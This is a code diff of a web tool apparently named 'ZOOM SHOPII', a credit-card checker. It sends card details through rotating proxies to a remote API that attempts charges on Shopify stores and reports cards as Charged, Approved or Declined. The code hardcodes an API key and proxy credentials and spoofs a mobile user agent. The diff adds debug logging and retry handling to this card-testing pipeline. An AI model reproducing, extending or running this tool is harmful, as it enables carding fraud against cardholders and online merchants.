-                    <div id="massProgress" style="display:none; margin-top:15px;">
+                    <div id="massProgress" style="display:none; margin-top:12px;">
                         <p>Processing: <span id="massStatus">0%</span></p>
                         <div class="progress-bar"><div id="massProgressFill" class="progress-fill"></div></div>
-                        <p class="info-text" style="font-size:0.8rem; color:var(--text-dim);">
+                        <p class="info-text" style="font-size:0.75rem; color:var(--text-dim);">
                             💎 Charged: <span id="massChargedCount">0</span> | 
                             ✅ Approved: <span id="massApprovedCount">0</span> | 
                             ❌ Declined: <span id="massDeadCount">0</span>
@@ -1033,7 +1111,7 @@
                     <h2>🌐 Site Manager</h2>
                     <p class="subtitle">Manage your sites — upload, paste, check, and clean</p>
 
-                    <div style="display:flex; gap:20px; flex-wrap:wrap; margin-bottom:15px; background:var(--bg-card); border-radius:8px; padding:15px; border:1px solid var(--border-color);">
+                    <div style="display:flex; gap:15px; flex-wrap:wrap; margin-bottom:12px; background:var(--bg-card); border-radius:8px; padding:12px 15px; border:1px solid var(--border-color);">
                         <span class="info-text">Total Sites: <span class="highlight" id="siteTotalDisplay">0</span></span>
                         <span class="info-text">Live Sites: <span class="highlight" id="siteLiveDisplay">0</span></span>
                         <span class="info-text">Dead Sites: <span class="highlight" id="siteDeadDisplay">0</span></span>
@@ -1048,23 +1126,23 @@
                                 <button class="btn btn-secondary" id="uploadSitesBtn">Upload File</button>
                             </div>
 
-                            <div class="manual-area" style="margin-top:10px;">
+                            <div class="manual-area" style="margin-top:8px;">
                                 <h3>✏️ Manual Input</h3>
                                 <p>Paste sites (one per line)</p>
                                 <textarea id="manualSites" rows="4" placeholder="https://example.com&#10;https://another.com"></textarea>
                                 <button class="btn btn-secondary" id="addManualSitesBtn">➕ Add Sites</button>
                             </div>
 
-                            <div style="margin-top:10px; background:var(--bg-card); border:1px solid var(--border-color); border-radius:8px; padding:15px;">
-                                <h3 style="color:var(--neon-green); font-size:1rem; margin-bottom:8px;">⚡ Actions</h3>
+                            <div style="margin-top:8px; background:var(--bg-card); border:1px solid var(--border-color); border-radius:8px; padding:12px;">
+                                <h3 style="color:var(--neon-green); font-size:0.85rem; margin-bottom:6px;">⚡ Actions</h3>
                                 <div class="btn-group">
                                     <button class="btn btn-warning" id="checkSitesBtn">🔍 Check & Remove Dead</button>
                                     <button class="btn btn-danger" id="clearSitesBtn">🗑️ Clear All</button>
                                 </div>
-                                <div id="siteCheckProgress" style="display:none; margin-top:10px;">
+                                <div id="siteCheckProgress" style="display:none; margin-top:8px;">
                                     <p>Checking sites: <span id="siteCheckStatus">0%</span></p>
                                     <div class="progress-bar"><div id="siteCheckFill" class="progress-fill"></div></div>
-                                    <p class="info-text" style="font-size:0.8rem; color:var(--text-dim);">
+                                    <p class="info-text" style="font-size:0.7rem; color:var(--text-dim);">
                                         <span id="siteCheckAlive">0</span> alive | 
                                         <span id="siteCheckDead">0</span> dead | 
                                         <span id="siteCheckChecked">0</span>/<span id="siteCheckTotal">0</span>
@@ -1085,9 +1163,9 @@
                 <!-- PROXY MANAGER -->
                 <div id="tab-proxies" class="tab-content">
                     <h2>🔌 Proxy Manager</h2>
-                    <p class="subtitle">Manage your proxies — upload, paste, check, and clean</p>
+                    <p class="subtitle">Manage your proxies — ALL formats supported</p>
 
-                    <div style="display:flex; gap:20px; flex-wrap:wrap; margin-bottom:15px; background:var(--bg-card); border-radius:8px; padding:15px; border:1px solid var(--border-color);">
+                    <div style="display:flex; gap:15px; flex-wrap:wrap; margin-bottom:12px; background:var(--bg-card); border-radius:8px; padding:12px 15px; border:1px solid var(--border-color);">
                         <span class="info-text">Total Proxies: <span class="highlight" id="proxyTotalDisplay">0</span></span>
                         <span class="info-text">Live Proxies: <span class="highlight" id="proxyLiveDisplay">0</span></span>
                         <span class="info-text">Dead Proxies: <span class="highlight" id="proxyDeadDisplay">0</span></span>
@@ -1097,28 +1175,28 @@
                         <div>
                             <div class="upload-area">
                                 <h3>📤 Upload Proxies (.txt)</h3>
-                                <p>One proxy per line (IP:PORT:USER:PASS)</p>
+                                <p>One proxy per line — ALL formats supported</p>
                                 <input type="file" id="proxyFileInput" accept=".txt" />
                                 <button class="btn btn-secondary" id="uploadProxiesBtn">Upload File</button>
                             </div>
 
-                            <div class="manual-area" style="margin-top:10px;">
+                            <div class="manual-area" style="margin-top:8px;">
                                 <h3>✏️ Manual Input</h3>
                                 <p>Paste proxies (one per line)</p>
-                                <textarea id="manualProxies" rows="4" placeholder="192.168.1.1:8080:user:pass&#10;10.0.0.1:3128:user:pass"></textarea>
+                                <textarea id="manualProxies" rows="4" placeholder="user:pass@192.168.1.1:8080&#10;192.168.1.1:8080:user:pass&#10;192.168.1.1:8080"></textarea>
                                 <button class="btn btn-secondary" id="addManualProxiesBtn">➕ Add Proxies</button>
                             </div>
 
-                            <div style="margin-top:10px; background:var(--bg-card); border:1px solid var(--border-color); border-radius:8px; padding:15px;">
-                                <h3 style="color:var(--neon-green); font-size:1rem; margin-bottom:8px;">⚡ Actions</h3>
+                            <div style="margin-top:8px; background:var(--bg-card); border:1px solid var(--border-color); border-radius:8px; padding:12px;">
+                                <h3 style="color:var(--neon-green); font-size:0.85rem; margin-bottom:6px;">⚡ Actions</h3>
                                 <div class="btn-group">
                                     <button class="btn btn-warning" id="checkProxiesBtn">🔍 Check & Remove Dead</button>
                                     <button class="btn btn-danger" id="clearProxiesBtn">🗑️ Clear All</button>
                                 </div>
-                                <div id="proxyCheckProgress" style="display:none; margin-top:10px;">
+                                <div id="proxyCheckProgress" style="display:none; margin-top:8px;">
                                     <p>Checking proxies: <span id="proxyCheckStatus">0%</span></p>
                                     <div class="progress-bar"><div id="proxyCheckFill" class="progress-fill"></div></div>
-                                    <p class="info-text" style="font-size:0.8rem; color:var(--text-dim);">
+                                    <p class="info-text" style="font-size:0.7rem; color:var(--text-dim);">
                                         <span id="proxyCheckAlive">0</span> alive | 
                                         <span id="proxyCheckDead">0</span> dead | 
                                         <span id="proxyCheckChecked">0</span>/<span id="proxyCheckTotal">0</span>
@@ -1162,15 +1240,93 @@
 
     <script>
         // ================================================================
-        // ZOOM SHOPII - ULTRA FAST EDITION
+        // ZOOM SHOPII - ULTRA FAST EDITION WITH DEBUG
         // ================================================================
 
         // ===== CONFIGURATION =====
         const CONFIG = {
             API_SERVERS: ['https://shimmering-celebration-production-7dd0.up.railway.app'],
             CHECKER_API_KEY: 'AnonShopii2026!',
-            DEFAULT_PROXY: 'd1lgsabwmptd:9ki0plorgc80q50@216.26.231.190:3129'
+            DEFAULT_PROXY: 'd1lgsabwmptd:9ki0plorgc80q50@216.26.231.190:3129',
+            ANDROID_UA: 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36'
         };
+
+        // ===== DEBUG LOGGER =====
+        let debugLogs = [];
+        let debugVisible = false;
+
+        function logDebug(message, type = 'info') {
+            const time = new Date().toLocaleTimeString();
+            debugLogs.push({ time, message, type });
+            updateDebugUI();
+        }
+
+        function updateDebugUI() {
+            const container = document.getElementById('debugContent');
+            if (!container) return;
+            const html = debugLogs.slice(-50).map(e => {
+                const color = e.type === 'success' ? 'success' : e.type === 'error' ? 'error' : e.type === 'warning' ? 'warning' : e.type === 'raw' ? 'raw' : 'info';
+                return `<div class="log-entry"><span class="time">[${e.time}]</span> <span class="${color}">${e.message}</span></div>`;
+            }).join('');
+            container.innerHTML = html;
+            container.scrollTop = container.scrollHeight;
+        }
+
+        function toggleDebug() {
+            const content = document.getElementById('debugContent');
+            debugVisible = !debugVisible;
+            content.classList.toggle('active', debugVisible);
+        }
+
+        function clearDebug() {
+            debugLogs = [];
+            updateDebugUI();
+            logDebug('Log cleared', 'info');
+        }
+
+        async function testAPI() {
+            logDebug('🔍 Testing API connection...', 'info');
+            try {
+                const url = CONFIG.API_SERVERS[0] + '/check?site=shopify.com&key=' + CONFIG.CHECKER_API_KEY;
+                logDebug(`📡 Requesting: ${url.substring(0, 80)}...`, 'info');
+                const response = await fetch(url, {
+                    headers: { 'User-Agent': CONFIG.ANDROID_UA, 'Accept': 'application/json' }
+                });
+                logDebug(`📡 Response: ${response.status} ${response.statusText}`, response.ok ? 'success' : 'error');
+                if (response.ok) {
+                    const data = await response.json();
+                    logDebug(`📄 Response: ${JSON.stringify(data).substring(0, 150)}`, 'raw');
+                    logDebug('✅ API is reachable!', 'success');
+                } else {
+                    logDebug('❌ API returned error status!', 'error');
+                }
+            } catch (error) {
+                logDebug(`❌ API test FAILED: ${error.message}`, 'error');
+            }
+        }
+
+        async function testProxy() {
+            logDebug('🔍 Testing proxy...', 'info');
+            const proxy = CONFIG.DEFAULT_PROXY;
+            logDebug(`🔌 Proxy: ${proxy.substring(0, 30)}...`, 'info');
+            try {
+                const url = CONFIG.API_SERVERS[0] + '/check?site=shopify.com&key=' + CONFIG.CHECKER_API_KEY + '&proxy=' + encodeURIComponent(proxy);
+                logDebug(`📡 Testing: ${url.substring(0, 80)}...`, 'info');
+                const response = await fetch(url, {
+                    headers: { 'User-Agent': CONFIG.ANDROID_UA, 'Accept': 'application/json' }
+                });
+                logDebug(`📡 Response: ${response.status} ${response.statusText}`, response.ok ? 'success' : 'error');
+                if (response.ok) {
+                    const data = await response.json();
+                    logDebug(`📄 Response: ${JSON.stringify(data).substring(0, 150)}`, 'raw');
+                    logDebug('✅ Proxy test completed!', 'success');
+                } else {
+                    logDebug('❌ Proxy test failed!', 'error');
+                }
+            } catch (error) {
+                logDebug(`❌ Proxy test ERROR: ${error.message}`, 'error');
+            }
+        }
 
         // ===== STATE =====
         let state = {
@@ -1301,111 +1457,69 @@
             saveState();
         }
 
-        // ===== VALIDATE PROXY FORMAT =====
-       function isValidProxy(line) {
-    const trimmed = line.trim();
-    if (!trimmed) return false;
-    
-    // ============================================================
-    // FORMAT 1: user:pass@host:port (with IP or Domain)
-    // Examples: 
-    //   d1lgsabwmptd:9ki0plorgc80q50@216.26.231.190:3129
-    //   user:pass@proxy.example.com:8080
-    // ============================================================
-    if (/^[^:]+:[^@]+@[a-zA-Z0-9\-\.]+:\d+$/.test(trimmed)) {
-        return true;
-    }
-    
-    // ============================================================
-    // FORMAT 2: host:port:user:pass (host can be IP or Domain)
-    // Examples:
-    //   216.26.231.190:3129:user:pass
-    //   proxy.example.com:8080:user:pass
-    // ============================================================
-    const parts = trimmed.split(':');
-    if (parts.length === 4) {
-        const host = parts[0];
-        const port = parts[1];
-        
-        // Check if host is valid IP OR valid Domain
-        const isIP = /^(\d{1,3}\.){3}\d{1,3}$/.test(host);
-        const isDomain = /^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$/.test(host);
-        
-        if ((isIP || isDomain) && !isNaN(port) && port > 0 && port < 65536) {
-            return true;
-        }
-    }
-    
-    // ============================================================
-    // FORMAT 3: host:port (with IP or Domain)
-    // Examples:
-    //   216.26.231.190:3129
-    //   proxy.example.com:8080
-    // ============================================================
-    if (parts.length === 2) {
-        const host = parts[0];
-        const port = parts[1];
-        
-        const isIP = /^(\d{1,3}\.){3}\d{1,3}$/.test(host);
-        const isDomain = /^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$/.test(host);
-        
-        if ((isIP || isDomain) && !isNaN(port) && port > 0 && port < 65536) {
-            return true;
-        }
-    }
-    
-    // ============================================================
-    // FORMAT 4: host:port@user:pass (rare but supported)
-    // Example: proxy.example.com:8080@user:pass
-    // ============================================================
-    if (trimmed.includes('@')) {
-        const atParts = trimmed.split('@');
-        if (atParts.length === 2) {
-            const hostPort = atParts[0];
-            const userPass = atParts[1];
-            const hpParts = hostPort.split(':');
-            const upParts = userPass.split(':');
-            if (hpParts.length === 2 && upParts.length === 2) {
-                const host = hpParts[0];
-                const port = hpParts[1];
+        // ===== ULTIMATE PROXY VALIDATOR =====
+        function isValidProxy(line) {
+            const trimmed = line.trim();
+            if (!trimmed) return false;
+
+            // FORMAT 1: user:pass@host:port (with IP or Domain)
+            if (/^[^:]+:[^@]+@[a-zA-Z0-9\-\.]+:\d+$/.test(trimmed)) return true;
+
+            const parts = trimmed.split(':');
+
+            // FORMAT 2: host:port:user:pass (host can be IP or Domain)
+            if (parts.length === 4) {
+                const host = parts[0];
+                const port = parts[1];
                 const isIP = /^(\d{1,3}\.){3}\d{1,3}$/.test(host);
                 const isDomain = /^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$/.test(host);
-                if ((isIP || isDomain) && !isNaN(port) && port > 0 && port < 65536) {
-                    return true;
+                if ((isIP || isDomain) && !isNaN(port) && port > 0 && port < 65536) return true;
+            }
+
+            // FORMAT 3: host:port (with IP or Domain)
+            if (parts.length === 2) {
+                const host = parts[0];
+                const port = parts[1];
+                const isIP = /^(\d{1,3}\.){3}\d{1,3}$/.test(host);
+                const isDomain = /^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$/.test(host);
+                if ((isIP || isDomain) && !isNaN(port) && port > 0 && port < 65536) return true;
+            }
+
+            // FORMAT 4: host:port@user:pass (rare but supported)
+            if (trimmed.includes('@')) {
+                const atParts = trimmed.split('@');
+                if (atParts.length === 2) {
+                    const hostPort = atParts[0];
+                    const userPass = atParts[1];
+                    const hpParts = hostPort.split(':');
+                    const upParts = userPass.split(':');
+                    if (hpParts.length === 2 && upParts.length === 2) {
+                        const host = hpParts[0];
+                        const port = hpParts[1];
+                        const isIP = /^(\d{1,3}\.){3}\d{1,3}$/.test(host);
+                        const isDomain = /^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$/.test(host);
+                        if ((isIP || isDomain) && !isNaN(port) && port > 0 && port < 65536) return true;
+                    }
                 }
             }
-        }
-    }
-    
-    // ============================================================
-    // FORMAT 5: With protocol prefix
-    // Examples:
-    //   socks5://user:pass@host:port
-    //   http://host:port
-    //   https://host:port
-    // ============================================================
-    const protoMatch = trimmed.match(/^(socks5|socks4|http|https):\/\/(.+)$/i);
-    if (protoMatch) {
-        const rest = protoMatch[2];
-        // Check if it's user:pass@host:port
-        if (/^[^:]+:[^@]+@[a-zA-Z0-9\-\.]+:\d+$/.test(rest)) {
-            return true;
-        }
-        // Check if it's just host:port
-        const restParts = rest.split(':');
-        if (restParts.length === 2) {
-            const host = restParts[0];
-            const port = restParts[1];
-            const isIP = /^(\d{1,3}\.){3}\d{1,3}$/.test(host);
-            const isDomain = /^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$/.test(host);
-            if ((isIP || isDomain) && !isNaN(port) && port > 0 && port < 65536) {
-                return true;
+
+            // FORMAT 5: With protocol prefix
+            const protoMatch = trimmed.match(/^(socks5|socks4|http|https):\/\/(.+)$/i);
+            if (protoMatch) {
+                const rest = protoMatch[2];
+                if (/^[^:]+:[^@]+@[a-zA-Z0-9\-\.]+:\d+$/.test(rest)) return true;
+                const restParts = rest.split(':');
+                if (restParts.length === 2) {
+                    const host = restParts[0];
+                    const port = restParts[1];
+                    const isIP = /^(\d{1,3}\.){3}\d{1,3}$/.test(host);
+                    const isDomain = /^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$/.test(host);
+                    if ((isIP || isDomain) && !isNaN(port) && port > 0 && port < 65536) return true;
+                }
             }
+
+            return false;
         }
-    }
-    
-    return false;
-}
 
         // ===== MASK CARD =====
         function maskCard(card) {
@@ -1474,7 +1588,7 @@
             `).join('');
         }
 
-        // ===== RENDER SITES WITH NUMBERS AND HEADERS =====
+        // ===== RENDER SITES =====
         function renderSites() {
             if (state.sites.length === 0) {
                 els.siteList.innerHTML = '<div class="list-item" style="color:var(--text-dim);">No sites uploaded yet</div>';
@@ -1532,7 +1646,7 @@
             els.liveSiteCount.textContent = state.sites.length;
         }
 
-        // ===== RENDER PROXIES WITH NUMBERS AND HEADERS =====
+        // ===== RENDER PROXIES =====
         function renderProxies() {
             if (state.proxies.length === 0) {
                 els.proxyList.innerHTML = '<div class="list-item" style="color:var(--text-dim);">No proxies uploaded yet</div>';
@@ -1620,6 +1734,7 @@
             state.sites.splice(index, 1);
             renderSites();
             updateStats();
+            logDebug(`🗑️ Removed site #${index + 1}`, 'info');
         }
 
         async function retestSite(index) {
@@ -1632,13 +1747,16 @@
             }
             
             const proxy = state.proxies[Math.floor(Math.random() * state.proxies.length)];
+            logDebug(`🔄 Retesting site: ${site}`, 'info');
             const result = await testSiteWithPrice(site, proxy);
             
             if (result.status === 'alive') {
                 state.sites[index] = { url: site, status: 'ALIVE', price: result.price.toFixed(2), added: new Date().toLocaleDateString() };
+                logDebug(`✅ Site ALIVE: ${site} - $${result.price.toFixed(2)}`, 'success');
                 alert('✅ Site is ALIVE! Price: $' + result.price.toFixed(2));
             } else {
                 state.sites[index] = { url: site, status: 'DEAD', price: '0.00', added: new Date().toLocaleDateString() };
+                logDebug(`❌ Site DEAD: ${site}`, 'error');
                 alert('❌ Site is DEAD!');
             }
             renderSites();
@@ -1650,12 +1768,14 @@
             state.proxies.splice(index, 1);
             renderProxies();
             updateStats();
+            logDebug(`🗑️ Removed proxy #${index + 1}`, 'info');
         }
 
         async function retestProxy(index) {
             const proxy = state.proxies[index];
             if (!proxy) return;
             
+            logDebug(`🔄 Retesting proxy: ${proxy.substring(0, 30)}...`, 'info');
             const startTime = performance.now();
             const result = await testProxy(proxy);
             const endTime = performance.now();
@@ -1663,9 +1783,11 @@
             
             if (result.status === 'alive') {
                 state.proxies[index] = { proxy: proxy, status: 'ALIVE', latency: latency + 'ms', added: new Date().toLocaleDateString() };
+                logDebug(`✅ Proxy ALIVE: ${proxy.substring(0, 30)}... - ${latency}ms`, 'success');
                 alert('✅ Proxy is ALIVE! Latency: ' + latency + 'ms');
             } else {
                 state.proxies[index] = { proxy: proxy, status: 'DEAD', latency: 'N/A', added: new Date().toLocaleDateString() };
+                logDebug(`❌ Proxy DEAD: ${proxy.substring(0, 30)}...`, 'error');
                 alert('❌ Proxy is DEAD!');
             }
             renderProxies();
@@ -1791,17 +1913,39 @@
             return false;
         }
 
-        // ===== CHECK CARD =====
+        // ================================================================
+        // 🔥 FIXED: CHECK CARD - Handles objects AND strings
+        // ================================================================
         async function checkCard(card, site, proxy) {
+            // 🔥 FIX: Handle site as object or string
+            if (typeof site === 'object' && site !== null) {
+                site = site.url || site.toString();
+            }
+            if (typeof site !== 'string') {
+                site = String(site);
+            }
+            
+            const startTime = Date.now();
+            logDebug(`🔍 Checking: ${maskCard(card)} on ${site}`, 'info');
+            
             try {
                 const parts = card.split('|');
                 if (parts.length !== 4) {
-                    return { status: 'Invalid Format', message: 'Invalid card format', card: card };
+                    logDebug(`❌ Invalid format: ${card}`, 'error');
+                    return { status: 'Invalid', message: 'Invalid format', card: card };
                 }
+                
                 if (!site.startsWith('http')) site = 'https://' + site;
+                
                 let proxyStr = proxy;
                 if (proxy) {
-                    const proxyParts = proxy.split(':');
+                    if (typeof proxy === 'object' && proxy !== null) {
+                        proxyStr = proxy.proxy || proxy.toString();
+                    }
+                    if (typeof proxyStr !== 'string') {
+                        proxyStr = String(proxyStr);
+                    }
+                    const proxyParts = proxyStr.split(':');
                     if (proxyParts.length === 4) {
                         proxyStr = `${proxyParts[0]}:${proxyParts[1]}:${proxyParts[2]}:${proxyParts[3]}`;
                     } else if (proxyParts.length === 2) {
@@ -1809,22 +1953,41 @@
                     }
                 }
                 if (!proxyStr) proxyStr = CONFIG.DEFAULT_PROXY;
+                
                 const apiBase = CONFIG.API_SERVERS[Math.floor(Math.random() * CONFIG.API_SERVERS.length)];
-                const url = `${apiBase}/shopify?site=${site}&key=${CONFIG.CHECKER_API_KEY}&proxy=${proxyStr}&cc=${card}`;
-                const response = await fetch(url);
+                const url = `${apiBase}/shopify?site=${site}&key=${CONFIG.CHECKER_API_KEY}&proxy=${encodeURIComponent(proxyStr)}&cc=${card}`;
+                logDebug(`📡 URL: ${url.substring(0, 80)}...`, 'info');
+                
+                const response = await fetch(url, {
+                    headers: {
+                        'Accept': 'application/json',
+                        'User-Agent': CONFIG.ANDROID_UA,
+                        'X-Requested-With': 'XMLHttpRequest'
+                    }
+                });
+                
+                const elapsed = Date.now() - startTime;
+                logDebug(`⏱️ Response time: ${elapsed}ms`, 'info');
+                
                 if (!response.ok) {
+                    logDebug(`❌ HTTP ${response.status}: ${response.statusText}`, 'error');
                     return { status: 'Site Error', message: `HTTP ${response.status}`, card: card, retry: true };
                 }
+                
                 const raw = await response.json();
+                logDebug(`📄 Response: ${JSON.stringify(raw).substring(0, 150)}`, 'raw');
+                
                 const responseMsg = raw.Response || raw.card_response || '';
                 const price = raw.Price || raw.price || '-';
                 const priceValue = getPriceFromResponse(raw);
                 const priceDisplay = (price !== '-' && price !== 0) ? `$${price}` : '-';
                 const gateway = raw.Gate || raw.Gateway || raw.gate || 'Shopify Payments';
+                
                 if (isSiteDead(responseMsg, gateway, priceDisplay)) {
+                    logDebug(`⚠️ Site is dead`, 'warning');
                     return {
                         status: 'Site Error',
-                        message: responseMsg,
+                        message: responseMsg || 'Site is dead',
                         card: card,
                         retry: true,
                         gateway: gateway,
@@ -1832,8 +1995,11 @@
                         price_value: priceValue
                     };
                 }
+                
                 const r = responseMsg.toLowerCase();
-                if (r.includes('charged') || r.includes('order_placed') || r.includes('thank you') || r.includes('payment successful')) {
+                if (r.includes('charged') || r.includes('order_placed') || 
+                    r.includes('thank you') || r.includes('payment successful')) {
+                    logDebug(`💎 CHARGED! ${maskCard(card)}`, 'success');
                     return {
                         status: 'Charged',
                         message: responseMsg,
@@ -1844,13 +2010,20 @@
                         price_value: priceValue,
                         responseType: 'ORDER_PLACED'
                     };
-                } else if (r.includes('approved') || r.includes('success') || r.includes('insufficient_funds') || r.includes('insufficient funds') ||
-                    r.includes('invalid_cvv') || r.includes('incorrect_cvv') || r.includes('invalid_cvc') || r.includes('incorrect_cvc') ||
-                    r.includes('invalid cvv') || r.includes('incorrect cvv') || r.includes('invalid cvc') || r.includes('incorrect cvc') ||
-                    r.includes('incorrect_zip') || r.includes('incorrect zip') || r.includes('cvv issue') || r.includes('3d') || r.includes('3d secure') ||
-                    r.includes('otp') || r.includes('verification required') || r.includes('authenticate') || r.includes('authentication required') ||
-                    r.includes('challenge required') || r.includes('redirecting to bank') || r.includes('bank verification') || r.includes('send code') ||
+                } else if (r.includes('approved') || r.includes('success') || 
+                    r.includes('insufficient_funds') || r.includes('insufficient funds') ||
+                    r.includes('invalid_cvv') || r.includes('incorrect_cvv') || 
+                    r.includes('invalid_cvc') || r.includes('incorrect_cvc') ||
+                    r.includes('invalid cvv') || r.includes('incorrect cvv') ||
+                    r.includes('invalid cvc') || r.includes('incorrect cvc') ||
+                    r.includes('incorrect_zip') || r.includes('incorrect zip') ||
+                    r.includes('cvv issue') || r.includes('3d') || r.includes('3d secure') ||
+                    r.includes('otp') || r.includes('verification required') ||
+                    r.includes('authenticate') || r.includes('authentication required') ||
+                    r.includes('challenge required') || r.includes('redirecting to bank') ||
+                    r.includes('bank verification') || r.includes('send code') ||
                     r.includes('enter code') || r.includes('verify')) {
+                    logDebug(`✅ APPROVED! ${maskCard(card)}`, 'success');
                     let respType = 'APPROVED';
                     if (r.includes('insufficient_funds') || r.includes('insufficient funds')) respType = 'INSUFFICIENT_FUNDS';
                     else if (r.includes('3d') || r.includes('3d secure') || r.includes('challenge required') || r.includes('redirecting to bank') || 
@@ -1868,6 +2041,7 @@
                         responseType: respType
                     };
                 } else {
+                    logDebug(`❌ DECLINED: ${responseMsg.substring(0, 30)}`, 'error');
                     return {
                         status: 'Dead',
                         message: responseMsg,
@@ -1880,51 +2054,74 @@
                     };
                 }
             } catch (error) {
+                const elapsed = Date.now() - startTime;
+                logDebug(`❌ EXCEPTION after ${elapsed}ms: ${error.message}`, 'error');
                 return {
-                    status: 'Dead',
+                    status: 'Site Error',
                     message: error.message || 'API Error',
                     card: card,
-                    gateway: 'Unknown',
-                    price: '-',
-                    price_value: 0,
-                    responseType: 'ERROR'
+                    retry: true
                 };
             }
         }
 
-        // ===== CHECK CARD WITH RETRY =====
+        // ================================================================
+        // 🔥 FIXED: CHECK CARD WITH RETRY - Handles objects
+        // ================================================================
         async function checkCardWithRetry(card, maxRetries = 2) {
             if (state.sites.length === 0) {
-                return { status: 'Dead', message: 'No sites available', card: card, gateway: 'Unknown', price: '-', price_value: 0 };
+                logDebug(`❌ No sites available for ${maskCard(card)}`, 'error');
+                return { status: 'Site Error', message: 'No sites available', card: card };
             }
             if (state.proxies.length === 0) {
-                return { status: 'Dead', message: 'No proxies available', card: card, gateway: 'Unknown', price: '-', price_value: 0 };
+                logDebug(`❌ No proxies available for ${maskCard(card)}`, 'error');
+                return { status: 'Site Error', message: 'No proxies available', card: card };
             }
+            
             for (let attempt = 0; attempt < maxRetries; attempt++) {
-                const site = state.sites[Math.floor(Math.random() * state.sites.length)];
-                const proxy = state.proxies[Math.floor(Math.random() * state.proxies.length)];
+                // 🔥 FIX: Extract URL from site object
+                const siteObj = state.sites[Math.floor(Math.random() * state.sites.length)];
+                const site = typeof siteObj === 'object' ? siteObj.url : siteObj;
+                
+                const proxyObj = state.proxies[Math.floor(Math.random() * state.proxies.length)];
+                const proxy = typeof proxyObj === 'object' ? proxyObj.proxy : proxyObj;
+                
+                logDebug(`🔄 Attempt ${attempt + 1}/${maxRetries} for ${maskCard(card)}`, 'info');
                 const result = await checkCard(card, site, proxy);
                 if (!result.retry) return result;
-                if (attempt < maxRetries - 1) await new Promise(r => setTimeout(r, 50));
+                if (attempt < maxRetries - 1) {
+                    logDebug(`⏳ Waiting 100ms before retry...`, 'info');
+                    await new Promise(r => setTimeout(r, 100));
+                }
             }
-            return {
-                status: 'Site Error',
-                message: 'Max retries exceeded',
-                card: card,
-                gateway: 'Unknown',
-                price: '-',
-                price_value: 0,
-                responseType: 'ERROR'
-            };
+            logDebug(`❌ Max retries exceeded for ${maskCard(card)}`, 'error');
+            return { status: 'Site Error', message: 'Max retries exceeded', card: card };
         }
 
-        // ===== TEST SITE =====
+        // ================================================================
+        // 🔥 FIXED: TEST SITE WITH PRICE - Handles objects
+        // ================================================================
         async function testSiteWithPrice(site, proxy) {
+            // 🔥 FIX: Handle site as object or string
+            if (typeof site === 'object' && site !== null) {
+                site = site.url || site.toString();
+            }
+            if (typeof site !== 'string') {
+                site = String(site);
+            }
+            
             try {
                 if (!site.startsWith('http')) site = 'https://' + site;
+                
                 let proxyStr = proxy;
                 if (proxy) {
-                    const proxyParts = proxy.split(':');
+                    if (typeof proxy === 'object' && proxy !== null) {
+                        proxyStr = proxy.proxy || proxy.toString();
+                    }
+                    if (typeof proxyStr !== 'string') {
+                        proxyStr = String(proxyStr);
+                    }
+                    const proxyParts = proxyStr.split(':');
                     if (proxyParts.length === 4) {
                         proxyStr = `${proxyParts[0]}:${proxyParts[1]}:${proxyParts[2]}:${proxyParts[3]}`;
                     } else if (proxyParts.length === 2) {
@@ -1932,9 +2129,12 @@
                     }
                 }
                 if (!proxyStr) proxyStr = CONFIG.DEFAULT_PROXY;
+                
                 const apiBase = CONFIG.API_SERVERS[Math.floor(Math.random() * CONFIG.API_SERVERS.length)];
-                const url = `${apiBase}/check?site=${site}&key=${CONFIG.CHECKER_API_KEY}&proxy=${proxyStr}`;
-                const response = await fetch(url);
+                const url = `${apiBase}/check?site=${site}&key=${CONFIG.CHECKER_API_KEY}&proxy=${encodeURIComponent(proxyStr)}`;
+                const response = await fetch(url, {
+                    headers: { 'User-Agent': CONFIG.ANDROID_UA, 'Accept': 'application/json' }
+                });
                 if (!response.ok) return { site: site, status: 'dead', price: 0 };
                 const raw = await response.json();
                 if (raw.valid === true) {
@@ -1943,41 +2143,8 @@
                 } else if (raw.valid === false) {
                     return { site: site, status: 'dead', price: 0 };
                 }
-                const responseMsg = raw.card_response || raw.Response || '';
-                const gateway = raw.gate || raw.Gate || raw.Gateway || 'Shopify Payments';
-                const priceDisplay = raw.price || raw.Price || '-';
-                const priceValue = getPriceFromResponse(raw);
-                if (isSiteDead(responseMsg, gateway, priceDisplay)) {
-                    return { site: site, status: 'dead', price: 0 };
-                } else {
-                    return { site: site, status: 'alive', price: priceValue };
-                }
+                return { site: site, status: 'dead', price: 0 };
             } catch { return { site: site, status: 'dead', price: 0 }; }
-        }
-
-        // ===== TEST PROXY =====
-        async function testProxy(proxy) {
-            try {
-                const parts = proxy.split(':');
-                let proxyUrl;
-                if (parts.length === 4) {
-                    const [ip, port, user, password] = parts;
-                    proxyUrl = `http://${user}:${password}@${ip}:${port}`;
-                } else if (parts.length === 2) {
-                    const [ip, port] = parts;
-                    proxyUrl = `http://${ip}:${port}`;
-                } else {
-                    proxyUrl = `http://${proxy}`;
-                }
-                const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 5000);
-                const response = await fetch('https://api.ipify.org?format=json', {
-                    method: 'GET',
-                    signal: controller.signal
-                });
